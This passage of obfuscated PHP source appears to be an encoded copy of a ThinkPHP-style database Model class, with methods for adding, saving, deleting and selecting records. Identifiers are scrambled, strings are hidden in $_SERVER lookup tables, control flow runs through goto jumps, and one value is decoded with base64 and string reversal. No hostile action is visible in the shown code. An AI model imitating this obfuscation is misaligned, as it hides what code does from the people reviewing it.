str_replace($_SERVER[$dù´‡ˆùÇ[37]], $dù´‡ˆùÇ[20], $DŞ‚ÈÌß¤ˆ); $B½öÌ›¢ò‚ = $A¬±«ÖİäÛ . $dù´‡ˆùÇ[44] . $dé¯¸¤¼Ü½ . $dù´‡ˆùÇ[44] . $DŞ‚ÈÌß¤ˆ . $dù´‡ˆùÇ[44] . $CËÊæ¸÷Ú¡; write_log($B½öÌ›¢ò‚ . $dù´‡ˆùÇ[18] . get_caller_msg(1), $dù´‡ˆùÇ[19]); } $_SERVER[$_SERVER[©•ÖÏ¥Ø][45]] = $_SERVER[$_SERVER[©•ÖÏ¥Ø][37]] . $_SERVER[©•ÖÏ¥Ø][46]; $AÔÚÚ…ÔÜ· = strrev(base64_decode($_SERVER[©•ÖÏ¥Ø][47])); goto cƒ¥ß¸­™; BôÛƒïµ§Á: define($_SERVER[îÖ][230], 0); define($_SERVER[îÖ][231], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\x62\x6c\x65", "\157\162\144\x65\x72", "\x61\x6c\151\141\163", "\x68\x61\x76\151\156\x67", "\147\162\x6f\165\160", "\x6c\x6f\143\x6b", "\x64\x69\x73\164\151\x6e\x63\164", "\141\165\x74\157", "\x66\x69\154\x74\x65\162", "\166\141\154\x69\x64\x61\x74\145", "\162\x65\x73\x75\x6c\x74", "\142\x69\x6e\x64", "\x74\x6f\x6b\145\156"); public function __construct($f—÷¸†ùÔí = '', $CÚÍ‰–¹®ï = '', $bù¸”ºÔÚ = '') { $Eİéõë°ƒí =& $_SERVER[îÖ]; $this->_initialize(); if (!empty($f—÷¸†ùÔí)) { if (strpos($f—÷¸†ùÔí, $Eİéõë°ƒí[91])) { list($this->dbName, $this->name) = explode($Eİéõë°ƒí[91], $f—÷¸†ùÔí); } else { $this->name = $f—÷¸†ùÔí; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($CÚÍ‰–¹®ï)) { $this->tablePrefix = $Eİéõë°ƒí[33]; } elseif ($Eİéõë°ƒí[33] != $CÚÍ‰–¹®ï) { $this->tablePrefix = $CÚÍ‰–¹®ï; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($Eİéõë°ƒí[232]); } $this->db(0, empty($this->connection) ? $bù¸”ºÔÚ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $d˜Âìõ‘šõ =& $_SERVER[îÖ]; if (empty($this->fields)) { if (think_config($d˜Âìõ‘šõ[233])) { $EÔ²±Üíß— = $this->dbName ? $this->dbName : think_config($d˜Âìõ‘šõ[234]); $e«šæ°æ = think_var_cache($d˜Âìõ‘šõ[235] . strtolower(get_path_this($EÔ²±Üíß—) . $d˜Âìõ‘šõ[91] . $this->name)); if ($e«šæ°æ) { $F¢­”›•”ƒ = think_config($d˜Âìõ‘šõ[236]); if (empty($F¢­”›•”ƒ) || $e«šæ°æ[$d˜Âìõ‘šõ[237]] == $F¢­”›•”ƒ) { $this->fields = $e«šæ°æ; return; } } } $this->flush(); } } public function flush() { goto D‚¡Ü÷ê–«; aëªäï‹ÉÆ: if (!$b§Âîã¶ø) { return !1; } $this->fields = array_keys($b§Âîã¶ø); $this->fields[$bæ¥‚¡ê•„[238]] = !1; goto F‹ö•öòïí; F‹ö•öòïí: foreach ($b§Âîã¶ø as $aáÕ²ŠÆ¯ => $eŒ‹‡¡Ãê) { $a£ªŠáÖÖÑ[$aáÕ²ŠÆ¯] = $eŒ‹‡¡Ãê[$bæ¥‚¡ê•„[29]]; if ($eŒ‹‡¡Ãê[$bæ¥‚¡ê•„[36]]) { $this->fields[$bæ¥‚¡ê•„[239]] = $aáÕ²ŠÆ¯; if ($eŒ‹‡¡Ãê[$bæ¥‚¡ê•„[39]]) { $this->fields[$bæ¥‚¡ê•„[238]] = !0; } } } $this->fields[$bæ¥‚¡ê•„[240]] = $a£ªŠáÖÖÑ; if (think_config($bæ¥‚¡ê•„[236])) { $this->fields[$bæ¥‚¡ê•„[237]] = think_config($bæ¥‚¡ê•„[236]); } goto eÌäÂÖ†êù; D‚¡Ü÷ê–«: $bæ¥‚¡ê•„ =& $_SERVER[îÖ]; $this->db->setModel($this->name); $b§Âîã¶ø = $this->db->getFields($this->getTableName()); goto aëªäï‹ÉÆ; eÌäÂÖ†êù: if (think_config($bæ¥‚¡ê•„[233])) { $AéÀŸ†¹…Ä = $this->dbName ? $this->dbName : think_config($bæ¥‚¡ê•„[234]); think_var_cache($bæ¥‚¡ê•„[235] . strtolower(get_path_this($AéÀŸ†¹…Ä) . $bæ¥‚¡ê•„[91] . $this->name), $this->fields); } goto f¯³ˆ˜È¿ó; f¯³ˆ˜È¿ó: } public function switchModel($b†È‰÷ùÜÄ, $EÔ‘™òª¿Á = array()) { $A‰¯¸ÙŸÚ‡ =& $_SERVER[îÖ]; $Aïºª²àˆ = ucwords(strtolower($b†È‰÷ùÜÄ)) . $A‰¯¸ÙŸÚ‡[241]; if (!class_exists($Aïºª²àˆ)) { think_exception($Aïºª²àˆ . think_lang($A‰¯¸ÙŸÚ‡[242])); } $this->_extModel = new $Aïºª²àˆ($this->name); if (!empty($EÔ‘™òª¿Á)) { foreach ($EÔ‘™òª¿Á as $e¢Š¼õŒ–) { $this->_extModel->setProperty($e¢Š¼õŒ–, $this->{$e¢Š¼õŒ–}); } } return $this->_extModel; } public function __set($EÍáåì‰ ², $DğßË¦†µÄ) { $this->data[$EÍáåì‰ ²] = $DğßË¦†µÄ; } public function __get($F‚ê¼ÛÌ‹¯) { return isset($this->data[$F‚ê¼ÛÌ‹¯]) ? $this->data[$F‚ê¼ÛÌ‹¯] : null; } public function __isset($d¯µ‚ö®ò) { return isset($this->data[$d¯µ‚ö®ò]); } public function __unset($aØºÒ‡ÊãÒ) { unset($this->data[$aØºÒ‡ÊãÒ]); } public function __call($AøŸé«•åÕ, $A¶òÈÄÓ–ª) { $DÃíĞ†š‰® =& $_SERVER[îÖ]; if (in_array(strtolower($AøŸé«•åÕ), $this->methods, !0)) { $this->options[strtolower($AøŸé«•åÕ)] = $A¶òÈÄÓ–ª[0]; return $this; } elseif (in_array(strtolower($AøŸé«•åÕ), array($DÃíĞ†š‰®[243], $DÃíĞ†š‰®[244], $DÃíĞ†š‰®[245], $DÃíĞ†š‰®[246], $DÃíĞ†š‰®[247]), !0)) { $FáùÁ·¥½· = isset($A¶òÈÄÓ–ª[0]) ? $A¶òÈÄÓ–ª[0] : $DÃíĞ†š‰®[176]; $FáùÁ·¥½· = $this->db->parseKey($FáùÁ·¥½·); return $this->getField(strtoupper($AøŸé«•åÕ) . $DÃíĞ†š‰®[248] . $FáùÁ·¥½· . $DÃíĞ†š‰®[249] . $AøŸé«•åÕ, $DÃíĞ†š‰®[243]); } elseif (strtolower(substr($AøŸé«•åÕ, 0, 5)) == $DÃíĞ†š‰®[250]) { $FáùÁ·¥½· = think_parse_name(substr($AøŸé«•åÕ, 5)); $dçÄ†»Â÷Œ[$FáùÁ·¥½·] = $A¶òÈÄÓ–ª[0]; return $this->where($dçÄ†»Â÷Œ)->find(); } elseif (strtolower(substr($AøŸé«•åÕ, 0, 10)) == $DÃíĞ†š‰®[251]) { $d£«¬Â¬İ¦ = think_parse_name(substr($AøŸé«•åÕ, 10)); $dçÄ†»Â÷Œ[$d£«¬Â¬İ¦] = $A¶òÈÄÓ–ª[0]; return $this->where($dçÄ†»Â÷Œ)->getField($A¶òÈÄÓ–ª[1]); } elseif (isset($this->_scope[$AøŸé«•åÕ])) { return $this->scope($AøŸé«•åÕ, $A¶òÈÄÓ–ª[0]); } elseif (method_exists($this, $AøŸé«•åÕ)) { array_unshift($A¶òÈÄÓ–ª, $AøŸé«•åÕ); return call_user_func_array(array($this, $DÃíĞ†š‰®[252]), $A¶òÈÄÓ–ª); } else { return call_user_func_array(array(parent, $AøŸé«•åÕ), $A¶òÈÄÓ–ª); } } protected function call() { goto AŸÅ›ù¦³³; C©°à—®Ç³: $D‘ê«„×Œ™ = $f†ì†¿²’; if (is_array($f†ì†¿²’)) { $D‘ê«„×Œ™ = $f†ì†¿²’[1]; $f†ì†¿²’ = $f†ì†¿²’[0]; } $fëÔŸÌ§Ô = count($eôÊ‡Ô¡ô») - 1; goto DôÜ¤…Î£›; DôÜ¤…Î£›: if (isset($eôÊ‡Ô¡ô»[$fëÔŸÌ§Ô]) && $eôÊ‡Ô¡ô»[$fëÔŸÌ§Ô] === $f†ì†¿²’) { think_exception(__CLASS__ . $C¼“›™œ¾„[4] . $f†ì†¿²’ . think_lang($C¼“›™œ¾„[253])); return; } $eôÊ‡Ô¡ô»[] = $f†ì†¿²’; if (method_exists($this, $C¼“›™œ¾„[254])) { $d¯ˆê½ô¡— = call_user_func_array(array($this, $C¼“›™œ¾„[255]), array($D‘ê«„×Œ™, $eôÊ‡Ô¡ô»)); if (!is_null($d¯ˆê½ô¡—) && $d¯ˆê½ô¡— !== !1) { return $d¯ˆê½ô¡—; } } goto e‘ĞÌ¯âÌ‘; AŸÅ›ù¦³³: $C¼“›™œ¾„ =& $_SERVER[îÖ]; $eôÊ‡Ô¡ô» = func_get_args(); $f†ì†¿²’ = array_shift($eôÊ‡Ô¡ô»); goto C©°à—®Ç³; e‘ĞÌ¯âÌ‘: $DÃ Ÿä©× = call_user_func_array(array($this, $f†ì†¿²’), $eôÊ‡Ô¡ô»); if (method_exists($this, $C¼“›™œ¾„[256])) { $d¯ˆê½ô¡— = call_user_func_array(array($this, $C¼“›™œ¾„[257]), array($D‘ê«„×Œ™, $eôÊ‡Ô¡ô», $DÃ Ÿä©×)); if ($d¯ˆê½ô¡—) { return $d¯ˆê½ô¡—; } } return $DÃ Ÿä©×; goto EŒĞª™ñ; EŒĞª™ñ: } protected function _initialize() { } protected function _facade($CÒŠğ½Şà) { $FåŒ§ˆ™ =& $_SERVER[îÖ]; if (!empty($this->fields)) { foreach ($CÒŠğ½Şà as $b£Šùö«±Ò => $E¶„×½æñ) { if (!in_array($b£Šùö«±Ò, $this->fields, !0)) { unset($CÒŠğ½Şà[$b£Šùö«±Ò]); } elseif (is_scalar($E¶„×½æñ)) { $this->_parseType($CÒŠğ½Şà, $b£Šùö«±Ò); } } } if (!empty($this->options[$FåŒ§ˆ™[258]])) { $CÒŠğ½Şà = array_map($this->options[$FåŒ§ˆ™[258]], $CÒŠğ½Şà); unset($this->options[$FåŒ§ˆ™[258]]); } $this->_beforeWrite($CÒŠğ½Şà); return $CÒŠğ½Şà; } protected function _beforeWrite(&$E†Îî›‹¼) { } public function add($d¨«°–ÈÙ” = '', $DàÀÈƒÃ±Ä = array(), $aæªË·ˆ‚ = false) { goto e…Á°Ú¡ƒ¡; e…Á°Ú¡ƒ¡: if (empty($d¨«°–ÈÙ”)) { if (!empty($this->data)) { $d¨«°–ÈÙ” = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[îÖ][259]); return !1; } } $DàÀÈƒÃ±Ä = $this->_parseOptions($DàÀÈƒÃ±Ä); $d¨«°–ÈÙ” = $this->_facade($d¨«°–ÈÙ”); goto D‰¿ğ£¼†; f¯¼¥ì‰Ù: return $e­®˜öÍ›Š; goto aˆ’§…µ¢; D‰¿ğ£¼†: if (!1 === $this->_beforeInsert($d¨«°–ÈÙ”, $DàÀÈƒÃ±Ä)) { return !1; } $e­®˜öÍ›Š = $this->db->insert($d¨«°–ÈÙ”, $DàÀÈƒÃ±Ä, $aæªË·ˆ‚); if (!1 !== $e­®˜öÍ›Š) { $e‡İ‡“ = $this->getLastInsID(); if ($e‡İ‡“) { $d¨«°–ÈÙ”[$this->getPk()] = $e‡İ‡“; $this->_after_insert($d¨«°–ÈÙ”, $DàÀÈƒÃ±Ä); return $e‡İ‡“; } $this->_after_insert($d¨«°–ÈÙ”, $DàÀÈƒÃ±Ä); } goto f¯¼¥ì‰Ù; aˆ’§…µ¢: } protected function _beforeInsert(&$d÷ŸºØœ®ã, $aõÒ‚à’èª) { } protected function _after_insert($AÌìöËø¢à, $f„ô”‹½è¦) { } public function addAll($eÒ‘ÁåÇ„ˆ, $b‡‚£¸Ğê = array(), $F«­Èîœª« = false) { goto BÕæ¼¿Âäë; e§ª…¥õì: return $C¶áÔó¢ÖÅ; goto cÒ‚„¸‘Œˆ; fšƒÈÌÚ£Ø: foreach ($eÒ‘ÁåÇ„ˆ as $bç Õ§®‘‘ => $Bãå»Ï«ÚÏ) { $eÒ‘ÁåÇ„ˆ[$bç Õ§®‘‘] = $this->_facade($Bãå»Ï«ÚÏ); } if (method_exists($this->db, $c†ÙŞğ÷Ï[260])) { $C¶áÔó¢ÖÅ = $this->db->insertAll($eÒ‘ÁåÇ„ˆ, $b‡‚£¸Ğê, $F«­Èîœª«); } else { $this->startTrans(); foreach ($eÒ‘ÁåÇ„ˆ as $bç Õ§®‘‘ => $Bãå»Ï«ÚÏ) { $C¶áÔó¢ÖÅ = $this->db->insert($Bãå»Ï«ÚÏ, $b‡‚£¸Ğê, $F«­Èîœª«); } $this->commit(); } if (!1 !== $C¶áÔó¢ÖÅ) { $f¼–Ò¾—õ– = $this->getLastInsID(); if ($f¼–Ò¾—õ–) { return $f¼–Ò¾—õ–; } } goto e§ª…¥õì; BÕæ¼¿Âäë: $c†ÙŞğ÷Ï =& $_SERVER[îÖ]; if (empty($eÒ‘ÁåÇ„ˆ)) { $this->error = think_lang($c†ÙŞğ÷Ï[259]); return !1; } $b‡‚£¸Ğê = $this->_parseOptions($b‡‚£¸Ğê); goto fšƒÈÌÚ£Ø; cÒ‚„¸‘Œˆ: } public function selectAdd($dÍÁœóù»Í = '', $cÄÎÏ­ç®© = '', $A‡æÔÁá» = array()) { $FËî¤´ÌÇ =& $_SERVER[îÖ]; $A‡æÔÁá» = $this->_parseOptions($A‡æÔÁá»); if (!1 === ($aé¡è·°  = $this->db->selectInsert($dÍÁœóù»Í ? $dÍÁœóù»Í : $A‡æÔÁá»[$FËî¤´ÌÇ[261]], $cÄÎÏ­ç®© ? $cÄÎÏ­ç®© : $this->getTableName(), $A‡æÔÁá»))) { $this->error = think_lang($FËî¤´ÌÇ[262]); return !1; } else { return $aé¡è·° ; } } public function save($eš„…Şä…ù = '', $FÎÜ÷Ò¥—¿ = array()) { goto Dœå“²ë“ç; D¥í¢„öê: if (!1 !== $B­É„œæ‡) { if (isset($a¯·Ã™†“µ)) { $eš„…Şä…ù[$AÃšÜÜêÕ‚] = $a¯·Ã™†“µ; } $this->_afterUpdate($eš„…Şä…ù, $FÎÜ÷Ò¥—¿); } return $B­É„œæ‡; goto eÑ¤Ñæ¤°Ì; Dµò›Ÿœ†: if (is_array($FÎÜ÷Ò¥—¿[$BÎ‘Ä§™¦È[263]]) && isset($FÎÜ÷Ò¥—¿[$BÎ‘Ä§™¦È[263]][$AÃšÜÜêÕ‚])) { $a¯·Ã™†“µ = $FÎÜ÷Ò¥—¿[$BÎ‘Ä§™¦È[263]][$AÃšÜÜêÕ‚]; } if (!1 === $this->_beforeUpdate($eš„…Şä…ù, $FÎÜ÷Ò¥—¿)) { return !1; } $B­É„œæ‡ = $this->db->update($eš„…Şä…ù, $FÎÜ÷Ò¥—¿); goto D¥í¢„öê; Dœå“²ë“ç: $BÎ‘Ä§™¦È =& $_SERVER[îÖ]; if (empty($eš„…Şä…ù)) { if (!empty($this->data)) { $eš„…Şä…ù = $this->data; $this->data = array(); } else { $this->error = think_lang($BÎ‘Ä§™¦È[259]); return !1; } } $eš„…Şä…ù = $this->_facade($eš„…Şä…ù); goto c‰Œ²‚±ßæ; c‰Œ²‚±ßæ: $FÎÜ÷Ò¥—¿ = $this->_parseOptions($FÎÜ÷Ò¥—¿); $AÃšÜÜêÕ‚ = $this->getPk(); if (!isset($FÎÜ÷Ò¥—¿[$BÎ‘Ä§™¦È[263]])) { if (isset($eš„…Şä…ù[$AÃšÜÜêÕ‚])) { $aÁó  èä©[$AÃšÜÜêÕ‚] = $eš„…Şä…ù[$AÃšÜÜêÕ‚]; $FÎÜ÷Ò¥—¿[$BÎ‘Ä§™¦È[263]] = $aÁó  èä©; unset($eš„…Şä…ù[$AÃšÜÜêÕ‚]); } else { $this->error = think_lang($BÎ‘Ä§™¦È[262]); return !1; } } goto Dµò›Ÿœ†; eÑ¤Ñæ¤°Ì: } protected function _beforeUpdate(&$FåÇ‰‡ŠÀ¬, $dÎä½Á»‡„) { } protected function _afterUpdate($a˜ÖÈÚâ, $D£ÄÆóô­«) { } public function delete($dÕ†¿ˆ = array()) { goto C‚Ä¬è•ä¹; B×ã–››Æë: if (is_numeric($dÕ†¿ˆ) || is_string($dÕ†¿ˆ)) { if (strpos($dÕ†¿ˆ, $aÁ”¥ŠÉŠ[47])) { $AóŞ£÷Ö›[$A¥µ¾³ˆ›] = array($aÁ”¥ŠÉŠ[264], $dÕ†¿ˆ); } else { $AóŞ£÷Ö›[$A¥µ¾³ˆ›] = $dÕ†¿ˆ; } $this->options[$aÁ”¥ŠÉŠ[263]] = $AóŞ£÷Ö›; } $dÕ†¿ˆ = $this->_parseOptions(); if (is_array($dÕ†¿ˆ[$aÁ”¥ŠÉŠ[263]]) && isset($dÕ†¿ˆ[$aÁ”¥ŠÉŠ[263]][$A¥µ¾³ˆ›])) { $eº…ùÕªˆµ = $dÕ†¿ˆ[$aÁ”¥ŠÉŠ[263]][$A¥µ¾³ˆ›]; } goto e…¼ä˜Ó”; C‚Ä¬è•ä¹: $aÁ”¥ŠÉŠ =& $_SERVER[îÖ]; if (empty($dÕ†¿ˆ) && empty($this->options[$aÁ”¥ŠÉŠ[263]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $A¥µ¾³ˆ› = $this->getPk(); goto B×ã–››Æë; e…¼ä˜Ó”: $aœØë©íÕŠ = $this->db->delete($dÕ†¿ˆ); if (!1 !== $aœØë©íÕŠ) { $d¦ÓæÌ¶Š¶ = array(); if (isset($eº…ùÕªˆµ)) { $d¦ÓæÌ¶Š¶[$A¥µ¾³ˆ›] = $eº…ùÕªˆµ; } $this->_after_delete($d¦ÓæÌ¶Š¶, $dÕ†¿ˆ); } return $aœØë©íÕŠ; goto d½„¹–¬ìñ; d½„¹–¬ìñ: } protected function _after_delete($CÔ§åÌ×ƒ, $b¾¢¬¶š×¦) { } public function select($Eğ´ æ‡¾š = array()) { goto E‰ãĞ¦Œˆø; f†ŞÄç°ãá: $CÑ÷â×¾Ö§ = $this->db->select($Eğ´ æ‡¾š); if (!1 === $CÑ÷â×¾Ö§) { return !1; } if (empty($CÑ÷â×¾Ö§)) { return null; } goto AÈ‘¨Ì–…; E‰ãĞ¦Œˆø: $BÙª¡çÓ…ã =& $_SERVER[îÖ]; if (is_string($Eğ´ æ‡¾š) || is_numeric($Eğ´ æ‡¾š)) { $e³è÷–ÁÒ = $this->getPk(); if (strpos($Eğ´ æ‡¾š, $BÙª¡çÓ…ã[47])) { $cËã¦½«õ±[$e³è÷–ÁÒ] = array($BÙª¡çÓ…ã[264], $Eğ´ æ‡¾š); } else { $cËã¦½«õ±[$e³è÷–ÁÒ] = $Eğ´ æ‡¾š; } $this->options[$BÙª¡çÓ…ã[263]] = $cËã¦½«õ±; } elseif (!1 === $Eğ´ æ‡¾š) { $Eğ´ æ‡¾š = $this->_parseOptions(); return $BÙª¡çÓ…ã[265] . $this->db->buildSelectSql($Eğ´ æ‡¾š) . $BÙª¡çÓ…ã[266]; } $Eğ´ æ‡¾š = $this->_parseOptions(); goto f†ŞÄç°ãá; AÈ‘¨Ì–…: $this->_afterSelect($CÑ÷â×¾Ö§, $Eğ´ æ‡¾š); return $CÑ÷â×¾Ö§; goto C¢¾è‘˜ï; C¢¾è‘˜ï: } protected function _afterSelect(&$fŠäÂÂªÂ, $Dô÷Ÿ³Ò–) { } public function buildSql($eØ¯Å¤›İ = array()) { $dÏº¼‡äáó =& $_SERVER[îÖ]; $eØ¯Å¤›İ = $this->_parseOptions($eØ¯Å¤›İ); return $dÏº¼‡äáó[265] . $this->db->buildSelectSql($eØ¯Å¤›İ) . $dÏº¼‡äáó[266]; } public function optionsValue($dáİ•äóÅÏ = null) { if (is_null($dáİ•äóÅÏ)) { return $this->options; } elseif (is_array($dáİ•äóÅÏ)) { $this->options = array_merge($this->options, $dáİ•äóÅÏ); } } protected function _parseOptions($f…Ä”±ïºÙ = array()) { goto c•ª¿¦Î¿˜; A¢ò É˜ñ: if (!isset($f…Ä”±ïºÙ[$A´¯øøÔ† [267]])) { $f…Ä”±ïºÙ[$A´¯øøÔ† [267]] = $this->getTableName(); $F­ƒ´Ÿ¤Œ = $this->fields; } else { $F­ƒ´Ÿ¤Œ = $this->getDbFields(); } if (!empty($f…Ä”±ïºÙ[$A´¯øøÔ† [268]])) { $f…Ä”±ïºÙ[$A´¯øøÔ† [267]] .= $A´¯øøÔ† [50] . $f…Ä”±ïºÙ[$A´¯øøÔ† [268]]; } $f…Ä”±ïºÙ[$A´¯øøÔ† [269]] = $this->name; goto eÖ—ÜšĞì¾; c•ª¿¦Î¿˜: $A´¯øøÔ†  =& $_SERVER[îÖ]; if (is_array($f…Ä”±ïºÙ)) { $f…Ä”±ïºÙ = array_merge($this->options, $f…Ä”±ïºÙ); } $this->options = array(); goto A¢ò É˜ñ; eÖ—ÜšĞì¾: if (isset($f…Ä”±ïºÙ[$A´¯øøÔ† [263]]) && is_array($f…Ä”±ïºÙ[$A´¯øøÔ† [263]]) && !empty($F­ƒ´Ÿ¤Œ) && !isset($f…Ä”±ïºÙ[$A´¯øøÔ† [270]]) && !isset($f…Ä”±ïºÙ[$A´¯øøÔ† [267]])) { foreach ($f…Ä”±ïºÙ[$A´¯øøÔ† [263]] as $b²ÓÕÅ½„™ => $f«õ¿‘µºƒ) { $b²ÓÕÅ½„™ = trim($b²ÓÕÅ½„™); if (in_array($b²ÓÕÅ½„™, $F­ƒ´Ÿ¤Œ, !0)) { if (is_scalar($f«õ¿‘µºƒ)) { $this->_parseType($f…Ä”±ïºÙ[$A´¯øøÔ† [263]], $b²ÓÕÅ½„™); } } elseif (!is_numeric($b²ÓÕÅ½„™) && $A´¯øøÔ† [70] != substr($b²ÓÕÅ½„™, 0, 1) && !1 === strpos($b²ÓÕÅ½„™, $A´¯øøÔ† [91]) && !1 === strpos($b²ÓÕÅ½„™, $A´¯øøÔ† [248]) && !1 === strpos($b²ÓÕÅ½„™, $A´¯øøÔ† [271]) && !1 === strpos($b²ÓÕÅ½„™, $A´¯øøÔ† [272])) { unset($f…Ä”±ïºÙ[$A´¯øøÔ† [263]][$b²ÓÕÅ½„™]); } } } $this->_options_filter($f…Ä”±ïºÙ); return $f…Ä”±ïºÙ; goto D¦ÙÉ„ÎÄÓ; D¦ÙÉ„ÎÄÓ: } protected function _options_filter(&$a¾œ¿‡¤æÇ) { } protected function _parseType(&$Cµà¾’¯Â‹, $BÏ³¯¹Ñš™) { $Cé­åŒÁª =& $_SERVER[îÖ]; if (empty($this->options[$Cé­åŒÁª[273]][$Cé­åŒÁª[4] . $BÏ³¯¹Ñš™])) { $FŒ¼‰çØÅ¡ = strtolower($this->fields[$Cé­åŒÁª[240]][$BÏ³¯¹Ñš™]); if (!1 !== strpos($FŒ¼‰çØÅ¡, $Cé­åŒÁª[274])) { } elseif (!1 === strpos($FŒ¼‰çØÅ¡, $Cé­åŒÁª[275]) && !1 !== strpos($FŒ¼‰çØÅ¡, $Cé­åŒÁª[276])) { $Cµà¾’¯Â‹[$BÏ³¯¹Ñš™] = intval($Cµà¾’¯Â‹[$BÏ³¯¹Ñš™]); } elseif (!1 !== strpos($FŒ¼‰çØÅ¡, $Cé­åŒÁª[277]) || !1 !== strpos($FŒ¼‰çØÅ¡, $Cé­åŒÁª[278])) { $Cµà¾’¯Â‹[$BÏ³¯¹Ñš™] = floatval($Cµà¾’¯Â‹[$BÏ³¯¹Ñš™]); } elseif (!1 !== strpos($FŒ¼‰çØÅ¡, $Cé­åŒÁª[279])) { $Cµà¾’¯Â‹[$BÏ³¯¹Ñš™] = (bool) $Cµà¾’¯Â‹[$BÏ³¯¹Ñš™]; } } } public function find($cÌÁ›—¦İ› = array()) { goto bŞóôâëøø; d¹›×¯ĞÓ: if (!empty($this->options[$e«ã…Ÿàæ[281]])) { return $this->returnResult($this->data, $this->options[$e«ã…Ÿàæ[281]]); } return $this->data; goto cğ¢—Í™ô; D¨§‡»Œ‚¶: if (empty($a±¸Íæ‚‹æ)) { return null; } $this->data = $a±¸Íæ‚‹æ[0]; $this->_afterFind($this->data, $cÌÁ›—¦İ›); goto d¹›×¯ĞÓ; f¦˜›¤„“: $cÌÁ›—¦İ› = $this->_parseOptions(); $a±¸Íæ‚‹æ = $this->db->select($cÌÁ›—¦İ›); if (!1 === $a±¸Íæ‚‹æ) { return !1; } goto D¨§‡»Œ‚¶; bŞóôâëøø: $e«ã…Ÿàæ =& $_SERVER[îÖ]; if (is_numeric($cÌÁ›—¦İ›) || is_string($cÌÁ›—¦İ›)) { $AóĞ›òŠ¸–[$this->getPk()] = intval($cÌÁ›—¦İ›); $this->options[$e«ã…Ÿàæ[263]] = $AóĞ›òŠ¸–; } $this->options[$e«ã…Ÿàæ[280]] = 1; goto f¦˜›¤„“; cğ¢—Í™ô: } protected function _afterFind(&$e«˜ÓÖˆÜê, $döƒ²ÎÅ÷‰) { } protected function returnResult($dâ­µ¤¹ªÈ, $EøˆòÁÀö = '') { $Cº¡ÊÉÔ‡ =& $_SERVER[îÖ]; if ($EøˆòÁÀö) { if (is_callable($EøˆòÁÀö)) { return call_user_func($EøˆòÁÀö, $dâ­µ¤¹ªÈ); } switch (strtolower($EøˆòÁÀö)) { case $Cº¡ÊÉÔ‡[282]: return json_encode($dâ­µ¤¹ªÈ); case $Cº¡ÊÉÔ‡[283]: return xml_encode($dâ­µ¤¹ªÈ); } } return $dâ­µ¤¹ªÈ; } public function parseFieldsMap($D¿ò£Ş÷É¢, $a£™ÙÈ½¾Ü = 1) { if (!empty($this->_map)) { foreach ($this->_map as $bÌ­Ó•–¥ => $bõÑŒ¥ãŞ) { if ($a£™ÙÈ½¾Ü == 1) { if (isset($D¿ò£Ş÷É¢[$bõÑŒ¥ãŞ])) { $D¿ò£Ş÷É¢[$bÌ­Ó•–¥] = $D¿ò£Ş÷É¢[$bõÑŒ¥ãŞ]; unset($D¿ò£Ş÷É¢[$bõÑŒ¥ãŞ]); } } else { if (isset($D¿ò£Ş÷É¢[$bÌ­Ó•–¥])) { $D¿ò£Ş÷É¢[$bõÑŒ¥ãŞ] = $D¿ò£Ş÷É¢[$bÌ­Ó•–¥]; unset($D¿ò£Ş÷É¢[$bÌ­Ó•–¥]); } } } } return $D¿ò£Ş÷É¢; } public function setField($aß•¨É†­¼, $CÏÃçÇÅæ = '') { if (is_array($aß•¨É†­¼)) { $C½ƒë¤êà‰ = $aß•¨É†­¼; } else { $C½ƒë¤êà‰[$aß•¨É†­¼] = $CÏÃçÇÅæ; } return $this->save($C½ƒë¤êà‰); } public function setAdd($c•Õ”¡Šõ½, $AØ¬¨°Øœ = 1) { $bÈ›ì§“â =& $_SERVER[îÖ]; $Dµêøì÷Š™ = $c•Õ”¡Šõ½ . $bÈ›ì§“â[284] . $AØ¬¨°Øœ; if ($AØ¬¨°Øœ < 0) { $Dµêøì÷Š™ = $c•Õ”¡Šõ½ . $AØ¬¨°Øœ; } return $this->setField($c•Õ”¡Šõ½, array($bÈ›ì§“â[285], $Dµêøì÷Š™)); } public function getField($aÈ»‚¬äİà, $DÌá™ÄÙäÊ = null) { $e³‚¿İê™Í =& $_SERVER[îÖ]; $FĞ“Œø­Â‰[$e³‚¿İê™Í[261]] = $aÈ»‚¬äİà; $FĞ“Œø­Â‰ = $this->_parseOptions($FĞ“Œø­Â‰); $aÈ»‚¬äİà = trim($aÈ»‚¬äİà); if (strpos($aÈ»‚¬äİà, $e³‚¿İê™Í[47])) { if (!isset($FĞ“Œø­Â‰[$e³‚¿İê™Í[280]])) { $FĞ“Œø­Â‰[$e³‚¿İê™Í[280]] = is_numeric($DÌá™ÄÙäÊ) ? $DÌá™ÄÙäÊ : $e³‚¿İê™Í[33]; } $F—‘Í¦®Ö’ = $this->db->select($FĞ“Œø­Â‰); if (!empty($F—‘Í¦®Ö’)) { goto dÑñƒÄÌì“; c¾ÉéÈìŒÜ: foreach ($F—‘Í¦®Ö’ as $c—’‰®ŒÃò) { $DÙÉ¨÷áÛ÷ = $c—’‰®ŒÃò[$c–Ğ‡Á” ‡]; if (2 == $C„ÂÏµ¼Ç ) { $fØµ™Ê“±[$DÙÉ¨÷áÛ÷] = $c—’‰®ŒÃò[$DæÛ¦­Ë›±]; } else { $fØµ™Ê“±[$DÙÉ¨÷áÛ÷] = is_string($DÌá™ÄÙäÊ) ? implode($DÌá™ÄÙäÊ, $c—’‰®ŒÃò) : $c—’‰®ŒÃò; } } return $fØµ™Ê“±; goto Ešƒ¹¬—; dÑñƒÄÌì“: $C¢öÚŠ©­² = explode($e³‚¿İê™Í[47], $aÈ»‚¬äİà); $aÈ»‚¬äİà = array_keys($F—‘Í¦®Ö’[0]); $c–Ğ‡Á” ‡ = array_shift($aÈ»‚¬äİà); goto bÅ¿ƒ£°Ë†; bÅ¿ƒ£°Ë†: $DæÛ¦­Ë›± = array_shift($aÈ»‚¬äİà); $fØµ™Ê“± = array(); $C„ÂÏµ¼Ç  = 